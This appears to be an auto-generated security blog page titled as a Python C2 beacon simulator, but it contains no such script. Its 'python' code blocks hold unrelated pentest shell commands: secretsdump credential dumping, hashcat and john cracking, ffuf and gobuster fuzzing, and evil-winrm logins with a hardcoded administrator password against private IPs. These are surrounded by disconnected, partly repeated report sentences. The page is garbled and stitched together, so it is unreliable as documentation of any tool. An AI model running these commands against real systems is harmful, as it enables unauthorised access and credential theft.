---
TitleSEO: "C2 Beacon Simulator in Python | ZureFX"
TitlePost: "C2 Beacon Simulator — Python"
Author: "ZureFX"
Description: "A Python script for c2 beacon simulator. Built for security research and automation."
Keywords: "automation, fuzzer, rust, c, python"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-694.html"
URL_IMAGES: ""
Date: "2024-11-13"
Tags: "Automation, Fuzzer, Rust, C, Python"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-694"
Permalink: "/scripting/script-c2-beacon-simulator-694.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `ldapsearch`
- `dcomexec`
- `sharphound`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```python
crackmapexec smb 10.15.157.93 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.142.52/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.143.74
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.102.49/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.200.164/FUZZ
evil-winrm -i 10.105.75.159 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.103.2.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 27.56s
```
